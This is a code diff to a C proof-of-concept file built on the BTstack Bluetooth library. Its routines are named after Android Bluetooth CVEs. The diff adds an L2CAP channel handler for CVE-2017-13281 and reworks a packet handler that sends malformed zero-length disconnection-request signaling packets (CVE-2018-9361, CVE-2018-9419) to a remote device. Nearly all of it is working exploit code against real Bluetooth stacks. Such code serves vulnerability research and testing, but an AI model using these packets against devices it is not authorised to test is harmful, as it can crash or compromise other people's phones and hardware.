@@ -89,6 +89,11 @@ static void do_CVE_2018_9478()
     printf("SDP query status: %d\n", result);
 }
 
+/*
+ * Made some modifications in src/l2cap_signaling.c to add
+ * DISCONNECTION_REQUEST_FUZZ which sets the cmd length to 0
+ * and cmd code to DISCONNECTION_REQUEST
+ */
 // https://android.googlesource.com/platform/system/bt/+/488aa8befd5bdffed6cfca7a399d2266ffd201fb%5E!/#F0
 static void do_CVE_2019_2009()
 {
@@ -140,16 +145,6 @@ static void CVE_2019_2009_handler(uint8_t packet_type, uint16_t channel, uint8_t
         printf("[*] CVE_2019_2009_handler event: 0x%x", event);
     }
 }
-/*
- * Made some modifications in src/l2cap_signaling.c to add
- * DISCONNECTION_REQUEST_FUZZ which sets the cmd length to 0
- * and cmd code to DISCONNECTION_REQUEST
- */
-
-static void do_CVE_2018_9419(int psm) {
-    uint8_t status = gap_connect(remote_addr, 1);
-    printf("Status: %d\n", status);
-}
 
 static poc_channel_t poc_channel2;
 
@@ -158,14 +153,14 @@ static void CVE_2017_13283_handler(uint8_t packet_type, uint16_t channel, uint8_
 {
     if (packet_type != HCI_EVENT_PACKET)
         return;
-    uint8_t err;
+    uint8_t err = 0;
     uint16_t event = hci_event_packet_get_type(packet);
     switch (event)
     {
-    case L2CAP_EVENT_LE_CHANNEL_OPENED:
-        poc_channel2.psm = l2cap_event_le_channel_opened_get_psm(packet);
-        poc_channel2.local_cid = l2cap_event_le_channel_opened_get_local_cid(packet);
-        poc_channel2.handle = l2cap_event_le_channel_opened_get_handle(packet);
+    case L2CAP_EVENT_CHANNEL_OPENED:
+        poc_channel2.psm = l2cap_event_channel_opened_get_psm(packet);
+        poc_channel2.local_cid = l2cap_event_channel_opened_get_local_cid(packet);
+        poc_channel2.handle = l2cap_event_channel_opened_get_handle(packet);
         if (packet[2] != 0)
         {
             printf("Connection failed: psm[0x%x] %d\n", poc_channel2.psm, packet[2]);
@@ -174,22 +169,65 @@ static void CVE_2017_13283_handler(uint8_t packet_type, uint16_t channel, uint8_
         {
             printf("Connected: psm[0x%x]\n", poc_channel2.psm);
         }
-        l2cap_le_request_can_send_now_event(channel);
+        l2cap_request_can_send_now_event(channel);
         break;
-    case L2CAP_EVENT_LE_CHANNEL_CLOSED:
+    case L2CAP_EVENT_CHANNEL_CLOSED:
         printf("Disconnected\n");
         break;
-    case L2CAP_EVENT_LE_CAN_SEND_NOW:
-        printf("[*] error: %d\n", err);
+    case L2CAP_EVENT_CAN_SEND_NOW:
+        printf("[*] l2cap error: %d\n", err);
         break;
     default:
-        printf("[*] event: 0x%x", event);
+        printf("[*] l2cap event: 0x%x\n", event);
     }
 }
 
-static void do_CVE_2017_13283() {
+static void do_CVE_2017_13283()
+{
     uint8_t status = l2cap_create_channel(CVE_2017_13283_handler, remote_addr, BLUETOOTH_PROTOCOL_AVCTP, l2cap_max_mtu(), NULL);
     printf("Status: %d\n", status);
+}
+
+static poc_channel_t poc_channel3;
+
+static uint8_t data_channel_buffer[1024];
+static void CVE_2017_13281_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
+{
+    if (packet_type != HCI_EVENT_PACKET)
+        return;
+    uint8_t err = 0;
+    uint16_t event = hci_event_packet_get_type(packet);
+    switch (event)
+    {
+    case L2CAP_EVENT_CHANNEL_OPENED:
+        poc_channel3.psm = l2cap_event_channel_opened_get_psm(packet);
+        poc_channel3.local_cid = l2cap_event_channel_opened_get_local_cid(packet);
+        poc_channel3.handle = l2cap_event_channel_opened_get_handle(packet);
+        if (packet[2] != 0)
+        {
+            printf("Connection failed: psm[0x%x] %d\n", poc_channel3.psm, packet[2]);
+        }
+        else
+        {
+            printf("Connected: psm[0x%x]\n", poc_channel3.psm);
+        }
+        l2cap_request_can_send_now_event(channel);
+        break;
+    case L2CAP_EVENT_CHANNEL_CLOSED:
+        printf("Disconnected\n");
+        break;
+    case L2CAP_EVENT_CAN_SEND_NOW:
+        printf("[*] l2cap error: %d\n", err);
+        break;
+    default:
+        printf("[*] l2cap event: 0x%x\n", event);
+    }
+}
+
+// AVRCP great length check
+static void do_CVE_2017_13281()
+{
+    uint8_t status = l2cap_create_channel(CVE_2017_13281_handler, remote_addr, BLUETOOTH_PROTOCOL_AVCTP, l2cap_max_mtu(), NULL);
 }
 
 static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
@@ -208,7 +246,7 @@ static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packe
         // BTstack activated, get started
         if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
         {
-            do_CVE_2019_2009();
+            do_CVE_2018_9478();
         }
         break;
     case HCI_EVENT_CONNECTION_COMPLETE:
@@ -269,33 +307,36 @@ static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packe
         }
         else
         {
-    switch (event) {
-        case BTSTACK_EVENT_STATE:
-            // BTstack activated, get started 
-            if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING){
-                // Not fully needed for CVE-2018-9361, we just need to get a connection started
-                // TODO: Pull out the nessesary HCI commands that get run for creating a connection
-                // and create a method to just trigger a HCI_EVENT_CONNECTION_COMPLETE
-                // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
-                // Need to hook into l2cap send loop
+            switch (event)
+            {
+            case BTSTACK_EVENT_STATE:
+                // BTstack activated, get started
+                if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
+                {
+                    // Not fully needed for CVE-2018-9361, we just need to get a connection started
+                    // TODO: Pull out the nessesary HCI commands that get run for creating a connection
+                    // and create a method to just trigger a HCI_EVENT_CONNECTION_COMPLETE
+                    // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
+                    // Need to hook into l2cap send loop
+                }
+                break;
+            case HCI_EVENT_CONNECTION_COMPLETE:
+                handle = hci_event_connection_complete_get_connection_handle(packet);
+                printf("Connection complete (handle: %d)\n", handle);
+
+                // CVE-2018-9361
+                l2cap_send_signaling_packet(handle, DISCONNECTION_REQUEST_FUZZ,
+                                            l2cap_next_sig_id());
+            case HCI_EVENT_LE_META:
+                // CVE_2018_9419
+                handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
+                l2cap_send_le_signaling_packet(handle, DISCONNECTION_REQUEST_FUZZ,
+                                               l2cap_next_sig_id());
+            default:
+                printf("packet_handler: 0x%x\n", event);
             }
             break;
-        case HCI_EVENT_CONNECTION_COMPLETE:
-            handle = hci_event_connection_complete_get_connection_handle(packet);
-            printf("Connection complete (handle: %d)\n", handle);
-
-            // CVE-2018-9361
-            l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
-                l2cap_next_sig_id());
-        case HCI_EVENT_LE_META:
-            // CVE_2018_9419
-            handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
-            l2cap_send_le_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
-                l2cap_next_sig_id());
-        default:
-            printf("packet_handler: 0x%x\n", event);
         }
-        break;
     }
 }
 
